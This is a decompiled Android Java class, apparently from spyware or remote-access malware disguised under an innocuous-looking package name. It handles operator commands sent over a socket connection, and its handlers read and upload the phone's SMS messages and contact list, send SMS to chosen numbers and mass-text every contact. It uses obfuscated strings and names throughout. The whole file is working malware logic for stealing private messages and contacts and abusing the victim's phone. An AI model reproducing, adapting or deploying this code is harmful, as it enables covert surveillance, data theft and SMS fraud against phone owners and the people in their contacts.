package com.storm.safe.rock.service.modules.command;

import android.content.SharedPreferences;
import android.telephony.SubscriptionManager;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0324a9;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.ArrayList;
import java.util.Date;
import java.util.Set;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0856mc;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.a11;
import p000.kg1;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a8 */
/* loaded from: classes2.dex */
public final class C0351a8 implements InterfaceC0726jp {
    static {
        new a11(null);
    }

    /* renamed from: a3 */
    public static void m211884a3(C0324a9 c0324a9, C0323a8 c0323a8, JSONArray jSONArray) throws JSONException {
        JSONArray jSONArray2;
        long j = ((SharedPreferences) c0324a9.f53144a2.getValue()).getLong(C0324a9.f53141a4, 0L);
        if (j == 0) {
            AbstractC0003a2.m44c5("首次同步，上传全量 ", jSONArray.length(), " 条", "SmsModule");
            jSONArray2 = jSONArray;
        } else {
            JSONArray jSONArray3 = new JSONArray();
            int length = jSONArray.length();
            for (int i = 0; i < length; i++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                if (jSONObject.optLong("date", 0L) > j) {
                    jSONArray3.put(jSONObject);
                }
            }
            int length2 = jSONArray.length();
            int length3 = jSONArray3.length();
            String str = c0324a9.f53143a1.format(new Date(j));
            StringBuilder sbM38b9 = AbstractC0003a2.m38b9("增量同步：全量 ", length2, " 条，新增 ", length3, " 条（上次同步: ");
            sbM38b9.append(str);
            sbM38b9.append("）");
            t60.m214714d6("SmsModule", sbM38b9.toString());
            jSONArray2 = jSONArray3;
        }
        if (jSONArray2.length() == 0) {
            return;
        }
        ArrayList arrayList = new ArrayList();
        int length4 = jSONArray2.length();
        for (int i2 = 0; i2 < length4; i2++) {
            JSONObject jSONObject2 = jSONArray2.getJSONObject(i2);
            t60.m214694b5(jSONObject2, "unsyncedSms.getJSONObject(i)");
            arrayList.add(jSONObject2);
        }
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new SmsContactsCommandHandler$syncSmsToServer$1(c0323a8, arrayList, c0324a9, jSONArray2, null), 3);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("SMS_READ", "SMS_SEND", "SMS_SEND_ALL_CONTACTS", "SMS_GET_DUAL_SIM_STATUS", "CONTACTS_READ", "GET_CONTACTS", "CONTACTS_SEARCH", "CONTACTS_STATS");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0268 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01e8  */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        C0324a9 c0324a9;
        String str2;
        int iM211680a5;
        C0324a9 c0324a92;
        JSONArray jSONArray;
        C0324a9 c0324a93;
        boolean zM211679a4;
        C0324a9 c0324a94;
        Object objM213696a7;
        C1351vv c1351vv = C1351vv.f60710b1;
        JSONObject jSONObjectM213960a1 = null;
        switch (str.hashCode()) {
            case -1567509101:
                if (str.equals("CONTACTS_STATS")) {
                    t60.m214714d6("SmsContactsCmdHandler", "获取通讯录统计");
                    C0856mc c0856mc = uz0Var.f60536a0.f52373a4;
                    if (c0856mc == null) {
                        c0856mc = null;
                    }
                    C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
                    if (c0856mc != null) {
                        try {
                            jSONObjectM213960a1 = c0856mc.m213960a1();
                        } catch (Exception e) {
                            t60.m214705c6("SmsContactsCmdHandler", "获取通讯录统计失败", e);
                        }
                    }
                    if (jSONObjectM213960a1 != null && c0323a8M214869a5 != null) {
                        c0323a8M214869a5.m211658c4(StringUtil.m212470a0("KFYfLkw7GD1oIj9YBSk="), jSONObjectM213960a1);
                    }
                }
                return c1351vv;
            case -1525675762:
                boolean z = false;
                if (str.equals("SMS_GET_DUAL_SIM_STATUS")) {
                    t60.m214714d6("SmsContactsCmdHandler", "获取双卡状态");
                    C0323a8 c0323a8M214869a52 = uz0Var.m214869a5();
                    try {
                        try {
                            c0324a9 = uz0Var.f60536a0.f52372a3;
                        } catch (Exception unused) {
                        }
                        if (c0324a9 == null) {
                            t60.m214724f2("smsModule");
                            throw null;
                        }
                        dqtvuisjd dqtvuisjdVar = c0324a9.f53142a0;
                        if (AbstractC1117qo.m214411a7(dqtvuisjdVar, "android.permission.READ_PHONE_STATE") == 0) {
                            Object systemService = dqtvuisjdVar.getSystemService("telephony_subscription_service");
                            t60.m214693b4(systemService, "null cannot be cast to non-null type android.telephony.SubscriptionManager");
                            if (((SubscriptionManager) systemService).getActiveSubscriptionInfoCount() > 1) {
                                z = true;
                            }
                        }
                        t60.m214714d6("SmsContactsCmdHandler", "双卡状态: " + z);
                        if (c0323a8M214869a52 != null) {
                            String strM212470a0 = StringUtil.m212470a0("L0wQNnIrBSNoIj9YBS9e");
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put("isDualSim", z);
                            c0323a8M214869a52.m211658c4(strM212470a0, jSONObject2);
                        }
                    } catch (Exception e2) {
                        t60.m214705c6("SmsContactsCmdHandler", "获取双卡状态失败", e2);
                    }
                }
                return c1351vv;
            case -1361997036:
                if (str.equals("CONTACTS_SEARCH")) {
                    String strOptString = jSONObject != null ? jSONObject.optString("keyword", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    int iOptInt = jSONObject != null ? jSONObject.optInt("limit", 50) : 50;
                    t60.m214714d6("SmsContactsCmdHandler", "搜索联系人: ".concat(str2));
                    C0856mc c0856mc2 = uz0Var.f60536a0.f52373a4;
                    C0856mc c0856mc3 = c0856mc2 != null ? c0856mc2 : null;
                    C0323a8 c0323a8M214869a53 = uz0Var.m214869a5();
                    if (c0856mc3 != null && c0856mc3.m213961a3()) {
                        try {
                            JSONArray jSONArrayM213965a7 = c0856mc3.m213965a7(iOptInt, str2);
                            if (c0323a8M214869a53 != null) {
                                String strM212470a02 = StringUtil.m212470a0("KFYfLkw7GD1oIi5YAzlFBx4rRCQnTQ==");
                                JSONObject jSONObject3 = new JSONObject();
                                jSONObject3.put(PollingXHR.Request.EVENT_SUCCESS, true);
                                jSONObject3.put("keyword", str2);
                                jSONObject3.put("count", jSONArrayM213965a7.length());
                                jSONObject3.put("contacts", jSONArrayM213965a7);
                                c0323a8M214869a53.m211658c4(strM212470a02, jSONObject3);
                            }
                        } catch (Exception e3) {
                            t60.m214705c6("SmsContactsCmdHandler", "搜索联系人失败", e3);
                        }
                    } else if (c0323a8M214869a53 != null) {
                        String strM212470a03 = StringUtil.m212470a0("KFYfLkw7GD1oIi5YAzlFBx4rRCQnTQ==");
                        JSONObject jSONObject4 = new JSONObject();
                        jSONObject4.put(PollingXHR.Request.EVENT_SUCCESS, false);
                        jSONObject4.put("error", "没有通讯录读取权限");
                        c0323a8M214869a53.m211658c4(strM212470a03, jSONObject4);
                    }
                }
                return c1351vv;
            case -143461598:
                if (str.equals("SMS_SEND_ALL_CONTACTS")) {
                    String strOptString2 = jSONObject != null ? jSONObject.optString("message", "") : null;
                    str2 = strOptString2 != null ? strOptString2 : "";
                    int iOptInt2 = jSONObject != null ? jSONObject.optInt("simSlot", 0) : 0;
                    t60.m214714d6("SmsContactsCmdHandler", "群发通讯录所有联系人 (卡" + (iOptInt2 + 1) + ")");
                    C0323a8 c0323a8M214869a54 = uz0Var.m214869a5();
                    try {
                        try {
                            c0324a92 = uz0Var.f60536a0.f52372a3;
                        } catch (Exception e4) {
                            t60.m214705c6("dqtvuisjd", "群发短信失败", e4);
                            iM211680a5 = 0;
                        }
                        if (c0324a92 == null) {
                            t60.m214724f2("smsModule");
                            throw null;
                        }
                        iM211680a5 = c0324a92.m211680a5(iOptInt2, str2);
                        t60.m214714d6("SmsContactsCmdHandler", "群发完成: 成功 " + iM211680a5 + " 条");
                        if (c0323a8M214869a54 != null) {
                            String strM212470a04 = StringUtil.m212470a0("OFQCBUA5Hz1oIi5XFQVfPR87WyU=");
                            JSONObject jSONObject5 = new JSONObject();
                            jSONObject5.put(PollingXHR.Request.EVENT_SUCCESS, true);
                            jSONObject5.put("count", iM211680a5);
                            jSONObject5.put("simSlot", iOptInt2);
                            c0323a8M214869a54.m211658c4(strM212470a04, jSONObject5);
                        }
                    } catch (Exception e5) {
                        t60.m214705c6("SmsContactsCmdHandler", "群发短信失败", e5);
                    }
                }
                return c1351vv;
            case 365032962:
                if (str.equals("CONTACTS_READ")) {
                    int iOptInt3 = jSONObject != null ? jSONObject.optInt("limit", 500) : 500;
                    AbstractC0003a2.m44c5("收到读取通讯录命令，限制: ", iOptInt3, " 条", "SmsContactsCmdHandler");
                    C0856mc c0856mc4 = uz0Var.f60536a0.f52373a4;
                    if (c0856mc4 == null) {
                        c0856mc4 = null;
                    }
                    C0323a8 c0323a8M214869a55 = uz0Var.m214869a5();
                    boolean zM213961a3 = c0856mc4 != null ? c0856mc4.m213961a3() : false;
                    t60.m214714d6("SmsContactsCmdHandler", "通讯录读取权限状态: " + zM213961a3);
                    if (zM213961a3) {
                        t60.m214714d6("SmsContactsCmdHandler", "权限已授予，开始读取通讯录");
                        objM213696a7 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new SmsContactsCommandHandler$handleContactsRead$3(c0856mc4, iOptInt3, c0323a8M214869a55, null), interfaceC0876mv);
                        if (objM213696a7 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a7 != CoroutineSingletons.f57606a0) {
                            return objM213696a7;
                        }
                    } else {
                        t60.m214726f4("SmsContactsCmdHandler", "没有通讯录读取权限");
                        if (c0323a8M214869a55 != null) {
                            String strM212470a05 = StringUtil.m212470a0("KFYfLkw7GD1oNSpNEA==");
                            JSONObject jSONObject6 = new JSONObject();
                            jSONObject6.put(PollingXHR.Request.EVENT_SUCCESS, false);
                            jSONObject6.put("error", "正在请求通讯录权限，请在弹出的对话框中授权后重试");
                            jSONObject6.put("needPermission", true);
                            jSONObject6.put("count", 0);
                            jSONObject6.put("contacts", new JSONArray());
                            c0323a8M214869a55.m211658c4(strM212470a05, jSONObject6);
                        }
                    }
                    objM213696a7 = c1351vv;
                    if (objM213696a7 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 709141724:
                if (str.equals("SMS_READ")) {
                    int iOptInt4 = jSONObject != null ? jSONObject.optInt("limit", 100) : 100;
                    AbstractC0003a2.m44c5("[控制面板] 读取短信列表，限制: ", iOptInt4, " 条", "SmsContactsCmdHandler");
                    C0324a9 c0324a95 = uz0Var.f60536a0.f52372a3;
                    if (c0324a95 == null) {
                        c0324a95 = null;
                    }
                    C0323a8 c0323a8M214869a56 = uz0Var.m214869a5();
                    boolean z2 = c0324a95 != null && AbstractC1117qo.m214411a7(c0324a95.f53142a0, "android.permission.READ_SMS") == 0;
                    t60.m214714d6("SmsContactsCmdHandler", "短信读取权限: " + z2);
                    if (z2) {
                        try {
                            try {
                                c0324a93 = uz0Var.f60536a0.f52372a3;
                            } catch (Exception e6) {
                                t60.m214705c6("dqtvuisjd", "读取短信列表失败", e6);
                                jSONArray = new JSONArray();
                            }
                            if (c0324a93 == null) {
                                t60.m214724f2("smsModule");
                                throw null;
                            }
                            jSONArray = c0324a93.m211676a1(iOptInt4);
                            t60.m214714d6("SmsContactsCmdHandler", "读取到 " + jSONArray.length() + " 条短信");
                            if (c0323a8M214869a56 != null) {
                                String strM212470a06 = StringUtil.m212470a0("OFQCBUk5GC8=");
                                JSONObject jSONObject7 = new JSONObject();
                                jSONObject7.put(PollingXHR.Request.EVENT_SUCCESS, true);
                                jSONObject7.put("count", jSONArray.length());
                                jSONObject7.put("smsList", jSONArray);
                                c0323a8M214869a56.m211658c4(strM212470a06, jSONObject7);
                            }
                            if (c0324a95 != null && c0323a8M214869a56 != null && jSONArray.length() > 0) {
                                m211884a3(c0324a95, c0323a8M214869a56, jSONArray);
                            }
                        } catch (Exception e7) {
                            t60.m214705c6("SmsContactsCmdHandler", "读取短信失败", e7);
                            if (c0323a8M214869a56 != null) {
                                String strM212470a07 = StringUtil.m212470a0("OFQCBUk5GC8=");
                                JSONObject jSONObject8 = new JSONObject();
                                jSONObject8.put(PollingXHR.Request.EVENT_SUCCESS, false);
                                Object message = e7.getMessage();
                                if (message == null) {
                                    message = "未知错误";
                                }
                                jSONObject8.put("error", message);
                                jSONObject8.put("count", 0);
                                jSONObject8.put("smsList", new JSONArray());
                                c0323a8M214869a56.m211658c4(strM212470a07, jSONObject8);
                            }
                        }
                    } else {
                        t60.m214726f4("SmsContactsCmdHandler", "没有短信读取权限，弹出权限请求");
                        if (c0323a8M214869a56 != null) {
                            String strM212470a08 = StringUtil.m212470a0("OFQCBUk5GC8=");
                            JSONObject jSONObject9 = new JSONObject();
                            jSONObject9.put(PollingXHR.Request.EVENT_SUCCESS, false);
                            jSONObject9.put("error", "正在请求短信权限，请在手机上授权后重试");
                            jSONObject9.put("needPermission", true);
                            jSONObject9.put("count", 0);
                            jSONObject9.put("smsList", new JSONArray());
                            c0323a8M214869a56.m211658c4(strM212470a08, jSONObject9);
                        }
                    }
                }
                return c1351vv;
            case 709171918:
                if (str.equals("SMS_SEND")) {
                    String strOptString3 = jSONObject != null ? jSONObject.optString("phoneNumber", "") : null;
                    String str3 = strOptString3 == null ? "" : strOptString3;
                    String strOptString4 = jSONObject != null ? jSONObject.optString("message", "") : null;
                    str2 = strOptString4 != null ? strOptString4 : "";
                    int iOptInt5 = jSONObject != null ? jSONObject.optInt("simSlot", 0) : 0;
                    t60.m214714d6("SmsContactsCmdHandler", "发送短信到 " + str3 + " (卡" + (iOptInt5 + 1) + ")");
                    C0323a8 c0323a8M214869a57 = uz0Var.m214869a5();
                    try {
                        try {
                            c0324a94 = uz0Var.f60536a0.f52372a3;
                        } catch (Exception e8) {
                            t60.m214705c6("dqtvuisjd", "发送短信失败", e8);
                            zM211679a4 = false;
                        }
                        if (c0324a94 == null) {
                            t60.m214724f2("smsModule");
                            throw null;
                        }
                        zM211679a4 = c0324a94.m211679a4(str3, iOptInt5, str2);
                        t60.m214714d6("SmsContactsCmdHandler", zM211679a4 ? "短信发送成功" : "短信发送失败");
                        if (c0323a8M214869a57 != null) {
                            String strM212470a09 = StringUtil.m212470a0("OFQCBV49AipoIy5KBDZZ");
                            JSONObject jSONObject10 = new JSONObject();
                            jSONObject10.put(PollingXHR.Request.EVENT_SUCCESS, zM211679a4);
                            jSONObject10.put("phoneNumber", str3);
                            jSONObject10.put("simSlot", iOptInt5);
                            c0323a8M214869a57.m211658c4(strM212470a09, jSONObject10);
                        }
                    } catch (Exception e9) {
                        t60.m214705c6("SmsContactsCmdHandler", "发送短信失败", e9);
                    }
                }
                return c1351vv;
            case 2117774140:
                if (str.equals("GET_CONTACTS")) {
                }
                return c1351vv;
            default:
                return c1351vv;
        }
    }
}
